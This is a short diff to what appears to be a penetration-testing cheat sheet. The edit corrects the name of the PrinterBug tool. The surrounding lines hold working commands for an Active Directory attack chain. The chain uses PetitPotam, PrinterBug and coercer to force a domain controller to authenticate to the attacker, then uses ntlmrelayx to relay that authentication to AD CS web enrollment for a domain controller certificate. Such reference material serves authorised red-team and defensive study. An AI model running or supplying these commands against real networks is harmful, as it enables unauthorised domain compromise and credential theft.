@@ -389,7 +389,7 @@ Coercion -> relay -> domain compromise
 ++++++++++++++++++++++++++++++++++++++++
 # Force a machine (ideally a DC) to auth to you, then relay it:
 impacket-petitpotam <your-ip> <dc-ip>                       # MS-EFSRPC (EfsRpcOpenFileRaw)
-printerbug.py <domain>/<user>:<password>@<dc-ip> <your-ip>  # MS-RPRN spooler (Dementor); from the krbrelayx apt pkg. coercer (below) is the apt-native multi-vector alt
+printerbug <domain>/<user>:<password>@<dc-ip> <your-ip>     # MS-RPRN spooler (Dementor); apt `krbrelayx` installs it as `printerbug` (no .py). coercer (below) is the apt-native multi-vector alt
 coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
 # Relay coerced DC auth to AD CS web enrollment -> DC cert (dirkjanm relay-to-ADCS):
 impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
